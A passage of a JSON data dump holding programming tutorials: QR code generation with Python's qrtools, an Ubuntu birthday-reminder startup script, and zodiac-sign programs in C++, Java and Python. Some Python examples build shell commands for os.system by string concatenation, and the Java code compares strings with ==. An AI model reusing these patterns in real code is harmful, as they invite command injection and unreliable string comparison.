command\r\nprint (my_QR.filename)\r\nSample output\r\n/tmp/qr-1496334996.385343/7489ebbcc2a00056ddaaaac190bce473e5c03696ea1bd8ed83cf59a174283862.png\r\nThis file can now be moved to another folder as per our convenience# Python program to generate QR codefrom qrtools import QR\u00a0\u00a0import osmy_QR = QR(data = u\"Example\")my_QR.encode()\u00a0\u00a0# command to move the QR code to the desktopos.system(\"sudo mv \" + my_QR.filename + \" ~/Desktop\")The pixel value of the QR code may also be changed by specifying the value during the creation of the QR object. The default size tends to be a little small for reading using scanners on smartphones, so a size of around 10 would be ideal for such purposes, for example:\r\nmy_QR = QR(data = u\"example\", pixel_size = 10)\r\nThe below QR code has pixel size = 10, and has been encoded with a URLWe can also add email data, sms data, mms data, bookmarks, etc to the QR code. The following code excerpt is taken from the source code, which specifies the various data types that can be used along with the format of the data that would be required for its usage:# use these for custom data formats eg. url, phone number, VCARD# data should be an unicode object or a list of unicode objectsdata_encode = {\u00a0\u00a0\u00a0\u00a0'text': lambda data: data,\u00a0\u00a0\u00a0\u00a0'url': encode_url,\u00a0\u00a0\u00a0\u00a0'email': lambda data: 'mailto:' + re.compile(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0r'^mailto:', re.IGNORECASE\u00a0\u00a0\u00a0\u00a0).sub('', data),\u00a0\u00a0\u00a0\u00a0'emailmessage': lambda data: 'MATMSG:TO:' + data[0] + ';SUB:' + data[1] +\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0';BODY:' + data[2] + ';;',\u00a0\u00a0\u00a0\u00a0'telephone': lambda data: 'tel:' + re.compile(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0r'^tel:', re.IGNORECASE\u00a0\u00a0\u00a0\u00a0).sub('', data),\u00a0\u00a0\u00a0\u00a0'sms': lambda data: 'SMSTO:' + data[0] + ':' + data[1],\u00a0\u00a0\u00a0\u00a0'mms': lambda data: 'MMSTO:' + data[0] + ':' + data[1],\u00a0\u00a0\u00a0\u00a0'geo': lambda data: 'geo:' + data[0] + ', ' + data[1],\u00a0\u00a0\u00a0\u00a0'bookmark': lambda data: \"MEBKM:TITLE:\" + data[0] + \";URL:\" +\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data[1] + \";;\",\u00a0\u00a0\u00a0\u00a0# phonebook or meCard should be a list of tuples like this:\u00a0\u00a0\u00a0\u00a0# [('N', 'Name'), ('TEL', '231698890'), ...]\u00a0\u00a0\u00a0\u00a0'phonebook': lambda data: \"MECARD:\" + \";\".join([\":\".join(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in data]) + \";\"}From the above code, we observe the various data types that can be assigned and used while creating QR codes. For example, to use a bookmark as data we must provide data as a list, consisting of a title and the url. To accomplish this, we must do the following# Python program to generate QR codefrom qrtools import QR\u00a0\u00a0# creates the QR objectmy_QR = QR(data = [u\"geeksforgeeks\", u\"https://www.geeksforgeeks.org/\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data_type = 'bookmark')\u00a0\u00a0# encodes to a QR codemy_QR.encode()Read a QR codeScanning and reading a QR code is relatively simple. While creating the QR object, we must simply specify the path to the QR code as an argument. Suppose we are trying to decode the QR code created at the beginning of the article.# Python program to Scan and Read a QR codefrom qrtools import QRmy_QR = QR(filename = \"home/user/Desktop/qr.png\")\u00a0\u00a0# decodes the QR code and returns True if successfulmy_QR.decode()\u00a0\u00a0# prints the dataprint (my_QR.data)Output :\r\nExample\r\nWe may also print the values of the other parameters passed while creating the QR object to generate the QR code, for example, using the same QR code generated at the beginning of the article, additionally adding these print statements would give the following additional output\r\nprint (my_QR.data_type)\r\nprint (my_QR.pixel_size)\r\nprint (my_QR.margin_size)\r\nOutput:\r\ntext\r\n3\r\n4\r\nThis article is contributed by Deepak Srivatsav. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e65e55169d612709e18d04f2cdd51de7",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This app helps in reminding birthdays and notifying your friend\u2019s birthdays. This app uses Python and Ubuntu notifications to notify users on every startup of the system.# Python program For# Birthday Reminder Application\u00a0\u00a0# time module is must as reminder\u00a0# is set with the help of datesimport time\u00a0\u00a0# os module is used to notify user\u00a0# using default \"Ubuntu\" notification barimport os\u00a0\u00a0# Birthday file is the one in which the actual birthdays# and dates are present. This file can be\u00a0# manually edited or can be automated.\u00a0# For simplicity, we will edit it manually.# Birthdays should be written in this file in# the format: \"MonthDay Name Surname\" (Without Quotes)\u00a0\u00a0birthdayFile = '/path/to/birthday/file'\u00a0\u00a0def checkTodaysBirthdays():\u00a0\u00a0\u00a0\u00a0fileName = open(birthdayFile, 'r')\u00a0\u00a0\u00a0\u00a0today = time.strftime('%m%d')\u00a0\u00a0\u00a0\u00a0flag = 0\u00a0\u00a0\u00a0\u00a0for line in fileName:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if today in line:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0line = line.split(' ')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0flag =1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# line[1] contains Name and line[2] contains Surname\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.system('notify-send \"Birthdays Today: ' + line[1]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ ' ' + line[2] + '\"')\u00a0\u00a0\u00a0\u00a0if flag == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.system('notify-send \"No Birthdays Today!\"')\u00a0\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0checkTodaysBirthdays()Adding the script to StartupAfter writing the above code now it is the time to add this Python script to startup. This can be done in Ubuntu as follows:Firstly, we have to create an executable file for our reminder.py scriptThis can be done by typing the following command in the terminalsudo chmod +x reminder.py, where reminder.py is our script file name Now we have to transfer this file to the path where Linux searches for its default files:Type this command in terminal: sudo cp /path/to/our/reminder.py /usr/bin. This will add our executable script to /usr/bin.In global search, search for Startup ApplicationsClick on Add and Give a desired Name for your processType in the command. For example, our file name is reminder.py then type reminder.py in the command field and Select AddNOTE: The script runs automatically(once added to startup) everytime you start your system. Also, If you have more than two birthdays on the same day, both the birthdays will be notified in the notification.How the birthday file should look likeOutput after running the scriptThis article is contributed by Omkar Pathak. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "bd4f0505e73218162512d91010e17769",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "For given date of birth, this program displays an astrological sign or Zodiac sign.Examples :\u00a0\u00a0Input : Day = 10, Month = December\nOutput : Sagittarius\nExplanation :\nPeople born on this date have a zodiac Sagittarius.\n\nInput : Day = 7, Month = September\nOutput : Virgo\u00a0Recommended: Please try your approach on {IDE} first, before moving on to the solution.Approach :Although the exact dates can shift plus or minus a day, depending on the year, here are the general zodiac sign dates used by Western (or Tropical) astrology :\u00a0WESTERN ASTROLOGY STAR SIGN DATES :\n\nAries (March 21-April 19)\nTaurus (April 20-May 20)\nGemini (May 21-June 20)\nCancer (June 21-July 22)\nLeo (July 23-August 22)\nVirgo (August 23-September 22)\nLibra (September 23-October 22)\nScorpio (October 23-November 21)\nSagittarius (November 22-December 21)\nCapricorn (December 22-January 19)\nAquarius (January 20-February 18)\nPisces (February 19-March 20) We need to check our mentioned date and month and thus find its equivalent zodiac, i.e which zodiac fits in that particular date as well as month and print its corresponding zodiac sign.Below is the implementation of above approach :\u00a0\u00a0C++// CPP program to display astrological sign// or Zodiac sign for given date of birth#include <bits/stdc++.h>using namespace std;\u00a0void zodiac_sign(int day, string month){\u00a0\u00a0\u00a0\u00a0string astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"taurus\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cout<<astro_sign;}\u00a0\u00a0\u00a0\u00a0\u00a0// Driver codeint main (){\u00a0\u00a0\u00a0\u00a0\u00a0int day = 19;\u00a0\u00a0\u00a0\u00a0string month = \"may\";\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0;}\u00a0// This code is contributed by Gitanjali.Java// Java program to display astrological sign// or Zodiac sign for given date of birthimport java.io.*;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0static void zodiac_sign(int day, String month)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0String astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(astro_sign);\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// Driver code\u00a0\u00a0\u00a0\u00a0public static void main (String[] args)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int day = 19;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0String month = \"may\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}}\u00a0// This code is contributed by Gitanjali.Python# Python program to display astrological sign# or Zodiac sign for given date of birth\u00a0def zodiac_sign(day, 